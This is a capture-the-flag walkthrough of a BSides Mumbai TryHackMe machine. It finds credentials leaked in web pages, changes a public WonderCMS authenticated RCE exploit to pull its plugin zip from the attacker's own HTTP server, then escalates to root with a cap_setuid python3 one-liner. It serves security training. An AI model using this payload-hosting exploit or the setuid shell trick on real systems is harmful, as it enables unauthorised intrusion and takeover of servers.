# Boot2Root - 1 [5 solves] [493 points]

### Description
```
Fire the instance and start hacking
Instance - 1: https://tryhackme.com/jr/bsidesmumbaictfb1
Note : Brute forcing is not required.
```

### Nmap scan : 
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bc:2f:ed:d9:08:4d:e4:49:6b:26:f5:5b:30:11:2a:86 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdRsqsqN+sfAzzp5P6haGXAhpE1ssJl4fTTNWBAJbuzwQ/SsfCxPtjEYt2Rgl51lWQSZAlaltWzW7fEmYWIw5MmvhiBgt0yFQICWFLwxB6vQGPWuZqLuLH3ymQeMikMYAkW5n9Mo7ieTyQoWNwrec1+TeaqlIxCIRUEriHYEplK56OFHLOZstotMTutyety7c3dyPWQz2sRCbYvvhH1b+irNcbD6hMAeQIU0Mo3RCPdRE/lFF2gasPJgyJoRBefLP69lbgfmx2Qcz4M1KfrxcO+EVjAUcUTojYTstXD0tC1NQOoqIct6a4bzko4ZI5UZT7TltetcgvTfoJ4ymN13wX
|   256 16:5d:0a:c6:a1:2c:be:89:d7:97:02:41:20:c8:99:f7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoJNtZv0HFaOG2mHqXan5B8Jc3KIalvZE6KoZDX0op4KtdSVG03Z6ut+cQB12FE01VN2t68FlK6NIm4WflaHAs=
|   256 5d:fb:dd:2e:d2:0a:c7:5a:c4:f6:26:96:8a:f4:23:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/GuW+HEMd3QKuGoX3glrZp/YfIuHxj9NfO6Z0NO9Kw
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Website title - Home
8081/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tale SEO Agency CSS Template by TemplateMo website
```

### Foothold :

Port 80's web server contains a password :
```
# curl -i 10.10.216.229
HTTP/1.0 200 OK
...
		<section class="container mt-5 mb-5">
			<div class="row">
				<div class="col-lg-12 my-auto text-center padding40">
					<h1>It's alive!</h1>

<h4><a href="http://192.168.220.133/wondercms/loginURL">Click here to login.</a> Your password is: <b>43aNXqKv</b></a></h4>
				</div>
			</div>
...
```

However thats invalid, but port 8081 contains a password as well :
```
# curl -i 10.10.216.229:8081
HTTP/1.1 200 OK
...
  <footer>
    <div class="container">
      <div class="col-lg-12">
        <p>Copyright © 2036 <a href="#">Tale SEO Agency</a>. All rights reserved. 
        
        <br>Design: <a href="https://templatemo.com/hey_you?pass=VG@Jh76ngt@34f" target="_blank">TemplateMo</a></p>
      </div>
    </div>
  </footer>
...
```

Port 80's web server is running a version of WonderCMS which is vulnerable to an authenticated RCE : https://www.exploit-db.com/exploits/49155

However the exploit didn't work directly

By reading the code I found out that it's passing a github URL directly, but the machine is likely not having internet access : 
```
payload = "https://github.com/zetc0de/wonderplugin/archive/master.zip"
```

Just download that zip and host it on our machine with a HTTP server, and change that payload to a link to the zip file on our HTTP server :
```
payload = "http://10.4.9.186/master.zip"
```

Then the exploit worked :
```
# python3 49155.py http://10.10.216.229/loginURL VG@Jh76ngt@34f


\ \      /_ \  \ | _ \ __| _ \  __|  \  |  __|
 \ \ \  /(   |.  | |  |_|    / (    |\/ |\__   \_/\_/\___/_|\_|___/___|_|_\___|_|  _|____/

------[ Auth Remote Code Execution ]------
	
[+] Getting Token
[+] Sending Payload
[+] Get the shell
[+] Enjoy!
$ls
README.md
css
evil.php
preview.jpg
summary
version
wonderplugin.php
```

Then just get a true reverse shell for convenience, instead of using the exploit script

### Privesc : 

There's a python3 binary on bob's home directory

```
(remote) www-data@ubuntu:/home/bob$ ls -la
total 4392
drwxr-xr-x 4 bob  bob     4096 Dec 10 04:39 .
drwxr-xr-x 3 root root    4096 Dec  9 10:44 ..
-rw------- 1 bob  bob       52 Dec 10 04:39 .Xauthority
-rw------- 1 bob  bob        5 Dec  9 20:55 .bash_history
-rw-r--r-- 1 bob  bob      220 Dec  9 10:44 .bash_logout
-rw-r--r-- 1 bob  bob     3771 Dec  9 10:44 .bashrc
drwx------ 2 bob  bob     4096 Dec  9 10:49 .cache
drwx------ 2 bob  bob     4096 Dec  9 12:27 .gnupg
-rw-r--r-- 1 bob  bob      675 Dec  9 10:44 .profile
-rw-r--r-- 1 bob  bob        0 Dec  9 10:49 .sudo_as_admin_successful
-rw-rw-r-- 1 bob  bob      182 Dec  9 12:27 .wget-hsts
-rwxr-xr-x 1 root root 4456208 Dec  9 12:34 python3
```

Also, it has the setuid capability :
```
/home/bob/python3 = cap_setuid+ep
```

Just run that python3 binary and setuid to 0 and get a shell with it, then just read the flag : 
```
(remote) www-data@ubuntu:/home/bob$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
(remote) root@ubuntu:/home/bob# cd /root
(remote) root@ubuntu:/root# ls
root.txt
(remote) root@ubuntu:/root# cat root.txt
BSMumbai{S0rry_Friend0_Th1s_iz_end0}
```